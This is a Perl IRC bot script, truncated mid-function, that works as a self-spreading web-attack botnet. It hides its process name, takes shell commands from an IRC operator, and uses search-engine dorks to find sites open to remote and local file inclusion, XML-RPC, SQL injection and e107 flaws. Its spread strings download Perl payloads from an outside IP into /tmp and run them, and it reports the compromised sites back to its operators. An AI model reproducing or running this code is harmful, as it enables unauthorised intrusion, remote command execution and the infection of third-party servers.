#!/usr/bin/perluse HTTP::Request;use LWP::UserAgent;use IO::Socket;use IO::Select;use IO::Socket::INET;use Socket;use HTTP::Request::Common;use LWP::Simple;use LWP 5.64;use HTTP::Request::Common qw(POST);use Digest::MD5 qw(md5_hex);use MIME::Base64;			       my $datetime = localtime;my $fakeproc  	= "/usr/bin/perl"; my $ircserver   = "maruu.sintul.co.cc";my $ircport   	= "1234";my $nickname  	= "D-N-C";my $ident     	= "dosh";my $channel   	= "#Dosha";my $admin    	= "Dosha";my $fullname  	= "New Auto Scanner";my $rfilogo   = "(RFI)";my $lfilogo   = "(LFI)";my $xmllogo   = "(XML)";my $lfdlogo   = "(LFD)";my $sqllogo   = "(SQL)";my $e107logo  = "(e107)";my $rficmd    = '!rfi';my $lficmd    = '!lfi';my $xmlcmd    = '!xml';my $lfdcmd    = '!lfd';my $sqlcmd    = '!sql';my $e107cmd   = '!e107';my $cmdxml    = '!cmdxml';my $cmdlfi    = '!cmdlfi';my $cmde107   = '!cmde107';my $lfispread = "cd /tmp;wget http://122.116.169.59/scannn.txt;perl scannn.txt;rm -rf scannn*;fetch http://122.116.169.59/scannn.txt;perl scannn.txt;rm -rf scannn*";my $xmlspread = "cd /tmp;wget http://122.116.169.59/black.txt;perl black.txt;rm -rf black*;fetch http://122.116.169.59/black.txt;perl black.txt;rm -rf black*";my $rfiid     = "http://www.joca.com.pt/images/.logx";my $injector  = "http://www.joca.com.pt/images/.logy";my $bhlsprd   = "http://122.116.169.59/.logz";my @uagents   = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12","Mozilla/5.0 (Windows; U; Windows NT 5.1; pl-PL; rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5","Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1","Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9","Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)");my $uagent    = $uagents[rand(scalar(@uagents))];my $lfdtest   = "../../../../../../../../../../../../../../../proc/self/environ%00";my $lfdoutput = "root:(.+):(.+):(.+):(.+):(.+):(.+)";my @tabele		= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');my @kolumny		= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');$SIG{'INT'}   = 'IGNORE';$SIG{'HUP'}   = 'IGNORE';$SIG{'TERM'}  = 'IGNORE';$SIG{'CHLD'}  = 'IGNORE';#$SIG{'PS'}    = 'IGNORE';chdir("/");$ircserver = "$ARGV[0]" if $ARGV[0];$0 = "$fakeproc"."\0" x 16;my $pid = fork;exit if $pid;die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);our %irc_servers;our %DCC;my $dcc_sel = new IO::Select->new();$sel_client = IO::Select->new();sub sendraw {    if ($#_ == '1') {    my $socket = $_[0];    print $socket "$_[1]\n";    } else {        print $IRC_cur_socket "$_[0]\n";    }}my @domen = ("site:.org","site:.info","site:.net","site:.com","site:.edu","site:.mil","site:.int","site:.gov","site:.ac","site:.ad","site:.ae","site:.af","site:.ag","site:.ai","site:.al","site:.am","site:.an","site:.ao","site:.aq","site:.ar","site:.as","site:.asia","site:.at","site:.au","site:.aw","site:.ax","site:.az","site:.ba","site:.bb","site:.bd","site:.be","site:.bg","site:.bh","site:.bi","site:.bj","site:.bm","site:.bn","site:.bo","site:.br","site:.bs","site:.bt","site:.bw","site:.by","site:.bz","site:.ca","site:.cc","site:.cd","site:.cf","site:.cg","site:.ch","site:.ci","site:.ck","site:.cl","site:.cm","site:.cn","site:.co","site:.cr","site:.cu","site:.cv","site:.cx","site:.cy","site:.cz","site:.de","site:.dj","site:.dk","site:.dm","site:.do","site:.dz","site:.ec","site:.ee","site:.eg","site:.es","site:.eu","site:.fi","site:.fj","site:.fk","site:.fm","site:.fo","site:.fr","site:.gd","site:.ge","site:.gf","site:.gg","site:.gi","site:.gl","site:.gm","site:.gp","site:.gq","site:.gr","site:.gs","site:.gt","site:.gu","site:.gy","site:.hk","site:.hm","site:.hn","site:.hr","site:.ht","site:.hu","site:.id","site:.ie","site:.il","site:.im","site:.in","site:.io","site:.iq","site:.ir","site:.is","site:.it","site:.je","site:.jm","site:.jo","site:.jp","site:.ke","site:.kg","site:.kh","site:.ki","site:.km","site:.kn","site:.kr","site:.kw","site:.ky","site:.kz","site:.la","site:.lb","site:.lc","site:.li","site:.lk","site:.lr","site:.ls","site:.lt","site:.lu","site:.lv","site:.ly","site:.ma","site:.mc","site:.md","site:.me","site:.mg","site:.mk","site:.mo","site:.mn","site:.mp","site:.ms","site:.mt","site:.mu","site:.mv","site:.mw","site:.mx","site:.my","site:.mz","site:.na","site:.nc","site:.nf","site:.ng","site:.ni","site:.nl","site:.no","site:.nr","site:.nu","site:.nz","site:.om","site:.pa","site:.pe","site:.ph","site:.pg","site:.pk","site:.pl","site:.pn","site:.pr","site:.ps","site:.pt","site:.py","site:.qa","site:.re","site:.ro","site:.rs","site:.ru","site:.sa","site:.sb","site:.sd","site:.se","site:.sg","site:.sh","site:.si","site:.sk","site:.sl","site:.sm","site:.sn","site:.so","site:.sr","site:.st","site:.su","site:.sv","site:.sy","site:.sz","site:.tc","site:.tg","site:.th","site:.tj","site:.tk","site:.tn","site:.to","site:.tr","site:.tt","site:.tz","site:.tv","site:.tw","site:.ua","site:.ug","site:.uk","site:.us","site:.uy","site:.uz","site:.vc","site:.ve","site:.vg","site:.vi","site:.vn","site:.vu","site:.ws","site:.ye","site:.zm","site:.za","site:.zw");sub connector {    my $mynick = $_[0];    my $ircserver_con = $_[1];    my $ircport_con = $_[2];    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);    if (defined($IRC_socket)) {        $IRC_cur_socket = $IRC_socket;        $IRC_socket->autoflush(1);        $sel_client->add($IRC_socket);	$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;        nick("$mynick");        my $versi   = "(4New Auto Scanner)";        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");        sleep (1);}}sub parse {    my $servarg = shift;    if ($servarg =~ /^PING \:(.*)/) {        sendraw("PONG :$1");    }    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {        if (lc($1) eq lc($mynick)) {            $mynick = $4;            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;        }    }    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {        nick("$mynick".int rand(1));    }    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {        $mynick = $2;        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";        sendraw("MODE $mynick +Bx");        sendraw("JOIN $channel");        sleep(1);        sendraw("PRIVMSG $admin :Hi $admin im here !!!");    }}my $line_temp;while( 1 ) {    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }    select(undef, undef, undef, 0.01);    delete($irc_servers{''}) if (defined($irc_servers{''}));    my @ready = $sel_client->can_read(0);    next unless(@ready);    foreach $fh (@ready) {        $IRC_cur_socket = $fh;        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};        $nread = sysread($fh, $ircmsg, 4096);        if ($nread == 0) {            $sel_client->remove($fh);            $fh->close;            delete($irc_servers{$fh});        }        @lines = split (/\n/, $ircmsg);        $ircmsg =~ s/\r\n$//;        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);	    my $engine ="GooGLe,ReDiff,Bing,ALtaViSTa,AsK,UoL,YahOo,CluSty,GutSer,GooGle2,ExaLead,LyCos,VirgiLio,WebDe,HotBot,AoL,SaPo,DuCk,LyGo,YauSe,BaiDu,KiPoT,GiBLa,BLacK";            if ($path eq $mynick) {                if ($msg =~ /^PING (.*)/) {                    sendraw("NOTICE $nick :PING $1");                }                if ($msg =~ /^VERSION/) {                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");                }                if ($msg =~ /^TIME/) {                    sendraw("NOTICE $nick :TIME ".$datetime."");                }                if (&isAdmin($nick) && $msg eq "!die") {                    &shell("$path","kill -9 $$");                }                if (&isAdmin($nick) && $msg eq "!killall") {                    &shell("$path","killall -9 perl");                }                if (&isAdmin($nick) && $msg eq "!reset") {                    sendraw("QUIT :Restarting...");                }                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {                    sendraw("JOIN #".$1);                }                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {                    sendraw("PART #".$1);                }                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {                    sendraw("NICK ".$1);                }                if (&isAdmin($nick) && $msg =~ /^!pid/) {                    sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");                }                if (&isAdmin($nick) && $msg !~ /^!/) {                    &shell("$nick","$msg");                }           }            else {                if (&isAdmin($nick) && $msg eq "!die") {                    &shell("$path","kill -9 $$");                }                if (&isAdmin($nick) && $msg eq "!killall") {                    &shell("$path","killall -9 perl");                }                if (&isAdmin($nick) && $msg eq "!reset") {                    sendraw("QUIT :Restarting...");                }                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {                    sendraw("JOIN #".$1);                }                if (&isAdmin($nick) && $msg eq "!part") {                    sendraw("PART $path");                }                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {                    sendraw("PART #".$1);                }                if (&isAdmin($nick) && $msg =~ /^\!x (.*)/) {                    &shell("$path","$1");                }                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {                    &shell("$path","$1");                }                ################################################################################# HELP COMMAND                if ($msg=~ /^!help/) {                    my $helplogo = "(Help)";                    &msg("$path","$helplogo 14 $rficmd||14$lficmd||14$xmlcmd||14$lfdcmd||14$sqlcmd||14$e107cmd [bug] [dork] ");                    &msg("$path","$helplogo 14 !autorfi||14!autolfi||14!autoxml||14!autolfd||14!autosql||14!autoe107 [bug] [dork] ");                    &msg("$path","$helplogo 14 $cmdlfi||14$cmdxml||14$cmde107 [target] [cmd] ");                }                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {                    if (&isFound($injector,"BHLTeam")) {                        &notice("$nick","(Injector)14 PHP Shell Good!");                    } else {                        &notice("$nick","(Injector)14 PHP Shell 4LOST!!!");                    }                }                if (&isAdmin($nick) && $msg =~ /^!pid/) {                    &notice("$nick","Fake Process/PID : $fakeproc - $$");                }		################################################################################# CMD Injector COMMANDS		if ($msg=~ /^$cmdlfi\s+(.+?)\s+(.*)/){		    my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";		    my $cmd = $2;		    &cmdlfi($url,$cmd,$path);		}		if ($msg=~ /^$cmdxml\s+(.+?)\s+(.*)/){		    my $url = $1;		    my $cmd = $2;		    &cmdxml($url,$cmd,$path);		}		if ($msg=~ /^$cmde107\s+(.+?)\s+(.*)/){		    my $url = $1;		    my $cmd = $2;		    &cmde107($url,$cmd,$path);		}		################################################################################# RFI AUTO SCAN		if ($msg=~ /^!autorfi\s+(.+?)\s+(.*)/) {			if (my $pid = fork) {				waitpid($pid, 0);					}					else {						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];						if (fork) {    exit; } else {                            if (&isFound($rfiid,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2." ".$domens);                                &msg("$path","$rfilogo Dork :14 $dork");                                &msg("$path","$rfilogo Bugz :14 $bug");                                &msg("$path","$rfilogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,1);                            } else {                                &msg("$path","[ $nick ] $rfilogo 4PHP Shell Not Found!");                            }                        }                    }    exit;             }	}		################################################################################## RFI SCAN                if ($msg=~ /^$rficmd\s+(.+?)\s+(.*)/) {                    if (my $pid = fork) {                        waitpid($pid, 0);                    }                    else {                        if (fork) { exit; } else {                            if (&isFound($rfiid,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2);                                &msg("$path","$rfilogo Dork :14 $dork");                                &msg("$path","$rfilogo Bugz :14 $bug");                                &msg("$path","$rfilogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,1);                            } else {                                &msg("$path","[ $nick ] $rfilogo 4PHP Shell Not Found!");                            }                        }                        exit;                    }                }		################################################################################# LFI AUTO SCAN		if ($msg=~ /^!autolfi\s+(.+?)\s+(.*)/) {			if (my $pid = fork) {				waitpid($pid, 0);					}					else {						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];						if (fork) {    exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2." ".$domens);                                &msg("$path","$lfilogo Dork :14 $dork");                                &msg("$path","$lfilogo Bugz :14 $bug");                                &msg("$path","$lfilogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,2);                            } else {                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");                            }                        }                    }    exit;              }	}		################################################################################# LFI SCAN                if ($msg=~ /^$lficmd\s+(.+?)\s+(.*)/) {                    if (my $pid = fork) {                        waitpid($pid, 0);                    }                    else {                        if (fork) { exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2);                                &msg("$path","$lfilogo Dork :14 $dork");                                &msg("$path","$lfilogo Bugz :14 $bug");                                &msg("$path","$lfilogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,2);                            } else {                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");                            }                        }                        exit;                    }                }		################################################################################# XML AUTO SCAN		if ($msg=~ /^!autoxml\s+(.+?)\s+(.*)/) {			if (my $pid = fork) {				waitpid($pid, 0);					}					else {						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];						if (fork) {    exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2." ".$domens);                                &msg("$path","$xmllogo Dork :14 $dork");                                &msg("$path","$xmllogo Bugz :14 $bug");                                &msg("$path","$xmllogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,3);                            } else {                                &msg("$path","[ $nick ] $xmllogo 4PHP Shell Not Found!");                            }                        }                    }    exit;              }         }		################################################################################# XML SCAN		if ($msg=~ /^$xmlcmd\s+(.*?)\s+(.*)/ ) {		    if (my $pid = fork) {			waitpid($pid, 0);		    }		    else {			if (fork) { exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2);                                &msg("$path","$xmllogo Dork :14 $dork");                                &msg("$path","$xmllogo Bugz :14 $bug");                                &msg("$path","$xmllogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,3);                            } else {                                &msg("$path","[ $nick ] $xmllogo 4PHP Shell Not Found!");                            }                        }                        exit;                    }                }		################################################################################# LFD AUTO SCAN		if ($msg=~ /^!autolfd\s+(.+?)\s+(.*)/) {			if (my $pid = fork) {				waitpid($pid, 0);					}					else {						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];						if (fork) {    exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2." ".$domens);                                &msg("$path","$lfdlogo Dork :14 $dork");                                &msg("$path","$lfdlogo Bugz :14 $bug");                                &msg("$path","$lfdlogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,4);                            } else {                                &msg("$path","[ $nick ] $lfdlogo 4PHP Shell Not Found!");                            }                        }                    }    exit;              }         }		################################################################################# LFD SCAN                if ($msg=~ /^$lfdcmd\s+(.+?)\s+(.*)/) {                    if (my $pid = fork) {                        waitpid($pid, 0);                    }                    else {                        if (fork) { exit; } else {                            my ($bug,$dork) = ($1,$2);                            &msg("$path","$lfdlogo Dork :14 $dork");                            &msg("$path","$lfdlogo Bugz :14 $bug");                            &msg("$path","$lfdlogo 14Search Engine Loading ...");                            &scan_start($path,$bug,$dork,$engine,4);                        }                        exit;                    }                }		################################################################################# SQL AUTO SCAN		if ($msg=~ /^$autosql\s+(.+?)\s+(.*)/) {			if (my $pid = fork) {				waitpid($pid, 0);					}					else {						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];						if (fork) {    exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2." ".$domens);                                &msg("$path","$sqllogo Dork :14 $dork");                                &msg("$path","$sqllogo Bugz :14 $bug");                                &msg("$path","$sqllogo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,5);                            } else {                                &msg("$path","[ $nick ] $sqllogo 4PHP Shell Not Found!");                            }                        }                    }    exit;              }         }		################################################################################# SQL SCAN                if ($msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {                    if (my $pid = fork) {                        waitpid($pid, 0);                    }                    else {                        if (fork) { exit; } else {                            my ($bug,$dork) = ($1,$2);                            &msg("$path","$sqllogo Dork :14 $dork");                            &msg("$path","$sqllogo Bugz :14 $bug");                            &msg("$path","$sqllogo 14Search Engine Loading ...");                            &scan_start($path,$bug,$dork,$engine,5);                        }                        exit;                    }                }		################################################################################# E107 AUTO SCAN		if ($msg=~ /^$autoe107\s+(.+?)\s+(.*)/) {			if (my $pid = fork) {				waitpid($pid, 0);					}					else {						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];						if (fork) {    exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2." ".$domens);                                &msg("$path","$e107logo Dork :14 $dork");                                &msg("$path","$e107logo Bugz :14 $bug");                                &msg("$path","$e107logo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,6);                            } else {                                &msg("$path","[ $nick ] $e107logo 4PHP Shell Not Found!");                            }                        }                    }    exit;               }         }		################################################################################# E107 SCAN                if ($msg=~ /^$e107cmd\s+(.+?)\s+(.*)/) {                    if (my $pid = fork) {                        waitpid($pid, 0);                    }                    else {                        if (fork) { exit; } else {                            if (&isFound($injector,"BHLTeam")) {                                my ($bug,$dork) = ($1,$2);                                &msg("$path","$e107logo Dork :14 $dork");                                &msg("$path","$e107logo Bugz :14 $bug");                                &msg("$path","$e107logo 14Search Engine Loading ...");                                &scan_start($path,$bug,$dork,$engine,6);                            } else {                                &msg("$path","[ $nick ] $e107logo 4PHP Shell Not Found!");                            }                        }                        exit;                    }                }		#################################################################################             }        }        for(my $c=0; $c<= $#lines; $c++) {            $line = $lines[$c];            $line = $line_temp.$line if ($line_temp);            $line_temp = '';            $line =~ s/\r$//;            unless ($c == $#lines) {                &parse("$line");            } else {                if ($#lines == 0) {                    &parse("$line");                } elsif ($lines[$c] =~ /\r$/) {                    &parse("$line");                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {                    &parse("$line");                } else {                    $line_temp = $line;                }            }        }    }}#########################################sub type () {my ($chan,$bug,$dork,$engine,$type) = @_;	if ($type == 1){$type=&rfi($chan,$bug,$dork,$engine);}     elsif ($type == 2){$type=&lfi($chan,$bug,$dork,$engine);}     elsif ($type == 3){$type=&xml($chan,$bug,$dork,$engine);}     elsif ($type == 4){$type=&lfd($chan,$bug,$dork,$engine);}     elsif ($type == 5){$type=&sql($chan,$bug,$dork,$engine);}     elsif ($type == 6){$type=&e107($chan,$bug,$dork,$engine);}}sub scan_start() {my ($chan,$bug,$dork,$engine,$type) = @_;my $scan_part = 1;if ($scan_part == 1) {&msg("$chan","4Engine Part $scan_part $bug $dork");    if ($engine =~ /google/i) {        if (my $pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"GooGLe",$type);        } exit; }    }	    if ($engine =~ /google2/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"GooGle2",$type);        } exit; }    }	    if ($engine =~ /bing/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"Bing",$type);        } exit; }    }	    if ($engine =~ /altavista/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"ALtaViSTa",$type);        } exit; }    }	    if ($engine =~ /ask/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"AsK",$type);        } exit; }    }sleep(100);&msg("$chan","Just wait! scan one by one please...");sleep(20);$scan_part = 2;}	if ($scan_part == 2) {&msg("$chan","4Engine Part $scan_part $bug $dork");    if ($engine =~ /uol/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"UoL",$type);        } exit; }    }    if ($engine =~ /yahoo/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"YahOo",$type);        } exit; }    }	    if ($engine =~ /clusty/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"CluSty",$type);        } exit; }    }	    if ($engine =~ /gutser/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {            &type($chan,$bug,$dork,"GutSer",$type);        } exit; }    }	    if ($engine =~ /rediff/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"ReDiff",$type);        } exit; }    }sleep(100);&msg("$chan","Just wait! scan one by one please...");sleep(20);$scan_part = 3;}	if ($scan_part == 3) {&msg("$chan","4Engine Part $scan_part $bug $dork");    if ($engine =~ /virgilio/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"VirgiLio",$type);        } exit; }    }    if ($engine =~ /webde/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"WebDe",$type);        } exit; }    }    if ($engine =~ /exalead/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"ExaLead",$type);        } exit; }    }	    if ($engine =~ /lycos/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"LyCos",$type);        } exit; }    }    if ($engine =~ /hotbot/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"HotBot",$type);        } exit; }    }sleep(100);&msg("$chan","Just wait! scan one by one please...");sleep(20);$scan_part = 4;}if ($scan_part == 4) {&msg("$chan","4Engine Part $scan_part $bug $dork");    if ($engine =~ /aol/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"AoL",$type);        } exit; }    }	    if ($engine =~ /sapo/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"SaPo",$type);        } exit; }    }	    if ($engine =~ /duck/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"DuCk",$type);        } exit; }    }    if ($engine =~ /lygo/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"LyGo",$type);        } exit; }    }    if ($engine =~ /yause/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"YauSe",$type);        } exit; }    }sleep(100);&msg("$chan","Just wait! scan one by one please...");sleep(20);$scan_part = 5;}if ($scan_part == 5) {&msg("$chan","4Engine Part $scan_part $bug $dork");    if ($engine =~ /baidu/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"BaiDu",$type);        } exit; }    }    if ($engine =~ /kipot/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"KiPoT",$type);        } exit; }    }    if ($engine =~ /gibla/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"GiBLa",$type);        } exit; }    }    if ($engine =~ /black/i) {        if ($pid = fork) { waitpid($pid, 0); }        else { if (fork) { exit; } else {		&type($chan,$bug,$dork,"BLacK",$type);        } exit; }    }sleep(100);&msg("$chan","Just wait! scan one by one please...");sleep(20);$scan_part = 6;}if ($scan_part == 6) {&msg("$chan","4Completed All Part for $bug $dork");}}#########################################sub rfi() {    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $count = 0;    my @list = search_engine($chan,$bug,$dork,$engine,$rfilogo);    my $num = scalar(@list);    if ($num > 0) {        foreach my $site (@list) {            $count++;            if ($count == $num-1) { &msg("$chan","$rfilogo($engine)Scan finish for14 $dork"); }            my $rfixpl = "http://".$site.$bug.$rfiid."?";            my $rfivuln = "http://".$site.$bug."7[phpshell]?";            my $rfisprd = "http://".$site.$bug.$bhlsprd."?";            my $html = get_content($rfixpl);            if ( $html =~ /BHLTeam/ && $html =~ /uid=/) {                        os($rfixpl);                        &get_content($rfisprd);                        &msg("$chan","$rfilogo($engine)(RFI-Vuln)4 ".$rfivuln." 14".$un." (safemode-off)");                        &msg("Rocks","(RFI-Vuln)4 ".$rfivuln." 3".$un." (safemode-off)");                        &msg("underhack","(RFI-Vuln)4 ".$rfivuln." 3".$un." (safemode-off)");                        sleep(4);                    }elsif                ( $html =~ /BHLTeam/) {                        os($rfixpl);                        &get_content($rfisprd);                        &msg("$chan","$rfilogo($engine)(RFI-Vuln)2 ".$rfivuln." 14".$un." (safemode-on)");                        sleep(4);            }        }    }}sub lfi() {    my $chan = $_[0];    my $bug = $_[1];    my $dork = $_[2];    my $engine = $_[3];    my $count = 0;    my @list = &search_engine($chan,$bug,$dork,$engine,$lfilogo);    my $num = scalar(@list);    if ($num > 0) {        foreach my $site (@list) {            $count++;            if ($count == $num-1) { &msg("$chan","$lfilogo($engine) Scan finish for14 $dork"); }            my $lfidir  = "../../../../../../../../../../../../../../..";            my $lfixpl  = "http://".$site.$bug.$lfidir."/proc/self/environ%00";            my $lfivuln  = "http://".$site.$bug."7".$lfidir."/proc/self/environ%00";            my $lfishell = 